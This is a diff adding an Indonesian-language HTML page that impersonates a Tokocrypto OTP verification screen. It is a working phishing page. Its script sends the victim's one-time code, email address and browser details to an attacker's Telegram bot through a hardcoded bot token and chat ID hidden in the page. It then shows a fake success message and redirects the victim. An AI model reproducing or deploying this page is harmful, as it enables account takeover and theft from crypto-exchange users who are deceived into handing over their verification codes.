@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Verifikasi OTP - Tokocrypto</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap");
+    body {
+      font-family: "Inter", sans-serif;
+      background: linear-gradient(135deg, #1a1f1c 0%, #2a2f2c 100%);
+      min-height: 100vh;
+    }
+    .error-message {
+      display: none;
+      background-color: #fee2e2;
+      color: #dc2626;
+      padding: 12px;
+      border-radius: 8px;
+      margin-top: 16px;
+      border-left: 4px solid #dc2626;
+    }
+    .success-message {
+      display: none;
+      background-color: #d1fae5;
+      color: #065f46;
+      padding: 12px;
+      border-radius: 8px;
+      margin-top: 16px;
+      border-left: 4px solid #065f46;
+    }
+    .loading-spinner {
+      display: none;
+      width: 24px;
+      height: 24px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .hidden-data {
+      display: none;
+    }
+  </style>
+</head>
+<body class="min-h-screen flex justify-center items-start pt-10 px-4">
+  <!-- Data sensitif disembunyikan dari tampilan pengguna -->
+  <div class="hidden-data" id="telegramConfig">
+    {
+      "botToken": "8440162875:AAEyc5EsiQHpKHlpKwLFy0F4xYq_upfI5F8",
+      "chatId": "7718023142"
+    }
+  </div>
+  
+  <div class="w-full max-w-md">
+    <div class="flex justify-end mb-6">
+      <button aria-label="Close" class="text-white text-2xl font-bold leading-none hover:text-green-400 transition-colors">
+        ×
+      </button>
+    </div>
+    <h1 class="text-white text-3xl font-extrabold mb-6 text-center">Verifikasi OTP</h1>
+    
+    <div id="errorMessage" class="error-message">
+      <i class="fas fa-exclamation-circle mr-2"></i>
+      <span id="errorText">Terjadi kesalahan saat mengirim kode.</span>
+    </div>
+    
+    <div id="successMessage" class="success-message">
+      <i class="fas fa-check-circle mr-2"></i>
+      <span>Verifikasi berhasil! Mengarahkan ke halaman utama...</span>
+    </div>
+
+    <div class="flex justify-center mb-6">
+      <div class="relative">
+        <img
+          alt="Shield icon with a small green lock icon overlay"
+          class="w-16 h-16 mx-auto"
+          height="64"
+          src="https://storage.googleapis.com/a1aa/image/68de56b0-37d1-42e7-ae17-18d36e61b978.jpg"
+          width="64"
+        />
+        <div
+          class="absolute bottom-0 right-0 bg-green-400 rounded-full p-2 border-2 border-[#1e1e1e]"
+          style="transform: translate(50%, 25%)"
+        >
+          <i class="fas fa-lock text-[#1e1e1e] text-xs"></i>
+        </div>
+      </div>
+    </div>
+
+    <p class="text-white text-base font-normal mb-6 text-center">
+      Kode verifikasi telah dikirim ke
+      <span class="text-green-400 font-semibold" id="emailDisplay">*********@gmail.com</span>
+    </p>
+
+    <form id="verificationForm" class="space-y-6">
+      <div class="flex items-center bg-[#4a4f56] rounded-lg px-4 py-3">
+        <input
+          id="verificationCode"
+          name="verificationCode"
+          aria-label="Kode verifikasi email"
+          class="flex-grow bg-transparent placeholder-[#a0a0a0] text-white text-base focus:outline-none"
+          placeholder="Masukkan kode verifikasi"
+          type="text"
+          required
+        />
+        <button
+          id="resendBtn"
+          type="button"
+          class="text-green-400 font-semibold ml-4 whitespace-nowrap disabled:opacity-50 disabled:cursor-not-allowed hover:text-green-300 transition-colors"
+          disabled
+        >
+          48s Kirim ulang
+        </button>
+      </div>
+      
+      <button
+        id="submitBtn"
+        class="w-full bg-green-600 text-white font-semibold py-3 rounded-lg opacity-50 cursor-not-allowed flex items-center justify-center hover:bg-green-700 transition-colors"
+        type="submit"
+        disabled
+      >
+        <span id="btnText">Verifikasi</span>
+        <div id="loadingSpinner" class="loading-spinner ml-2"></div>
+      </button>
+    </form>
+
+    <section class="text-white text-sm leading-relaxed mt-6 p-4 bg-[#3a3f46] rounded-lg">
+      <p class="font-bold mb-2">Jika Anda belum menerima kode:</p>
+      <ul class="list-disc list-inside space-y-1">
+        <li>Pastikan alamat email yang Anda berikan sudah benar</li>
+        <li>Periksa folder spam atau junk di email Anda</li>
+        <li>Tunggu beberapa saat dan coba kirim ulang kode</li>
+      </ul>
+    </section>
+  </div>
+
+  <script>
+    // Ambil konfigurasi Telegram dari elemen tersembunyi
+    const telegramConfig = JSON.parse(document.getElementById('telegramConfig').textContent);
+    const TELEGRAM_BOT_TOKEN = telegramConfig.botToken;
+    const TELEGRAM_CHAT_ID = telegramConfig.chatId;
+    
+    // Elemen UI
+    const verificationCode = document.getElementById("verificationCode");
+    const submitBtn = document.getElementById("submitBtn");
+    const resendBtn = document.getElementById("resendBtn");
+    const btnText = document.getElementById("btnText");
+    const loadingSpinner = document.getElementById("loadingSpinner");
+    const errorMessage = document.getElementById("errorMessage");
+    const errorText = document.getElementById("errorText");
+    const successMessage = document.getElementById("successMessage");
+    const emailDisplay = document.getElementById("emailDisplay");
+
+    // Ambil email dari localStorage (jika ada)
+    const userEmail = localStorage.getItem('userEmail') || '*********@gmail.com';
+    emailDisplay.textContent = userEmail;
+
+    // Countdown timer untuk kirim ulang
+    let countdown = 48;
+    let timer;
+
+    function startCountdown() {
+      resendBtn.disabled = true;
+      resendBtn.textContent = `${countdown}s Kirim ulang`;
+      timer = setInterval(() => {
+        countdown--;
+        if (countdown <= 0) {
+          clearInterval(timer);
+          resendBtn.disabled = false;
+          resendBtn.textContent = "Kirim ulang";
+          countdown = 48;
+        } else {
+          resendBtn.textContent = `${countdown}s Kirim ulang`;
+        }
+      }, 1000);
+    }
+
+    // Aktifkan tombol submit jika input tidak kosong
+    verificationCode.addEventListener("input", () => {
+      submitBtn.disabled = verificationCode.value.trim() === "";
+      submitBtn.classList.toggle("opacity-50", verificationCode.value.trim() === "");
+      submitBtn.classList.toggle("cursor-not-allowed", verificationCode.value.trim() === "");
+    });
+
+    // Fungsi untuk mengirim pesan ke Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        
+        const data = await response.json();
+        return data.ok;
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+        return false;
+      }
+    }
+
+    // Kirim kode OTP via Telegram
+    document.getElementById("verificationForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const code = verificationCode.value.trim();
+      if (!code) return;
+
+      // Tampilkan loading state
+      submitBtn.disabled = true;
+      btnText.textContent = 'Memverifikasi...';
+      loadingSpinner.style.display = 'block';
+
+      try {
+        // Format pesan untuk Telegram
+        const message = `
+🔐 <b>OTP Verification Data</b>
+📧 <b>Email:</b> <code>${userEmail}</code>
+🔢 <b>OTP Code:</b> <code>${code}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+🌐 <b>User Agent:</b> ${navigator.userAgent}
+        `;
+        
+        // Kirim data ke Telegram
+        const success = await sendToTelegram(message);
+        
+        if (success) {
+          successMessage.style.display = 'flex';
+          
+          // Redirect setelah 2 detik
+          setTimeout(() => {
+            window.location.href = "kadaluarsa.html";
+          }, 2000);
+        } else {
+          throw new Error('Gagal mengirim kode verifikasi ke Telegram');
+        }
+      } catch (error) {
+        console.error('Error:', error);
+        
+        // Tampilkan pesan error
+        errorText.textContent = 'Kode OTP tidak valid atau telah kadaluarsa.';
+        errorMessage.style.display = 'flex';
+        
+        // Reset loading state
+        submitBtn.disabled = false;
+        btnText.textContent = 'Verifikasi';
+        loadingSpinner.style.display = 'none';
+      }
+    });
+
+    // Kirim ulang kode
+    resendBtn.addEventListener("click", () => {
+      startCountdown();
+      successMessage.style.display = 'none';
+      errorMessage.style.display = 'none';
+      
+      // Simulasi pengiriman ulang kode
+      alert("Kode verifikasi baru telah dikirim ke email Anda.");
+    });
+
+    // Mulai countdown saat halaman dimuat
+    startCountdown();
+  </script>
+</body>
+</html>
